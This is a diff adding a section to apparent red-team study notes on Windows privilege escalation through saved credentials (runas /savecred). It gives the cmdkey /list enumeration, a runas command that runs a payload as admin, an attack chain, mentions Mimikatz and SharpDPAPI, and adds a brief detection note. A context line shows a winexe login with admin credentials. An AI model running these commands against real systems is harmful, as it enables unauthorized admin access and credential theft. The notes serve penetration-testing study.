@@ -32,6 +32,168 @@ winexe -U 'admin%password' //10.48.167.46 cmd.exe
 
 ---
 
+Here’s your **clean red-team level note** on `runas /savecred` + Credential Storage 👇
+
+---
+
+# 🔴 Windows PrivEsc – Saved Credentials (runas /savecred)
+
+*(Red Team Operator Notes)*
+
+---
+
+# 🧠 1. Concept
+
+👉 Windows allows users to **save credentials** for reuse
+
+```text
+runas /savecred
+```
+
+👉 Credentials stored in:
+
+```text
+Credential Manager (Windows Vault)
+```
+
+---
+
+# 📍 2. Storage Locations
+
+## Logical Storage
+
+```text
+Windows Credential Manager
+```
+
+---
+
+## Physical Paths
+
+```text
+C:\Users\<username>\AppData\Local\Microsoft\Credentials\
+C:\Users\<username>\AppData\Local\Microsoft\Vault\
+```
+
+---
+
+# 🔒 3. Security Mechanism
+
+👉 Credentials are:
+
+* Encrypted using **DPAPI**
+* Bound to **user context**
+
+```text
+Plaintext access ❌
+Direct reading ❌
+```
+
+---
+
+# 🔍 4. Enumeration
+
+## List saved credentials
+
+```bash
+cmdkey /list
+```
+
+---
+
+## Example Output
+
+```text
+Target: Domain:interactive=admin
+User: admin
+```
+
+👉 💥 Indicates stored admin credentials
+
+---
+
+# 💣 5. Exploitation (IMPORTANT)
+
+## Command
+
+```bash
+runas /savecred /user:admin C:\path\payload.exe
+```
+
+---
+
+## What Happens
+
+1. System finds saved credentials
+2. No password prompt
+3. Executes as target user
+
+```text
+💥 Code runs as admin
+```
+
+---
+
+# ⚡ 6. Attack Chain
+
+```text
+cmdkey /list
+↓
+Saved creds found
+↓
+runas /savecred
+↓
+Execute payload
+↓
+💥 Privilege Escalation (Admin)
+```
+
+---
+
+# ⚠️ 7. Conditions
+
+✔ Credentials must be already saved
+✔ Target user must exist
+✔ Execution allowed
+
+---
+
+# 🚨 8. Limitations
+
+❌ No SYSTEM shell directly
+✔ But Admin access = high impact
+
+---
+
+# 🧬 9. Advanced Extraction (Post-Exploitation)
+
+👉 If SYSTEM access obtained:
+
+Tools:
+
+* Mimikatz
+* SharpDPAPI
+
+👉 Can decrypt stored credentials
+
+---
+
+# 🛡️ 10. Detection (Blue Team)
+
+Watch for:
+
+```text
+runas /savecred
+cmdkey /list
+```
+
+👉 Suspicious behavior 🚨
+
+---
+
+
+
+
 # 🔐 AlwaysInstallElevated (MSI PrivEsc)
 
 ## Check both keys
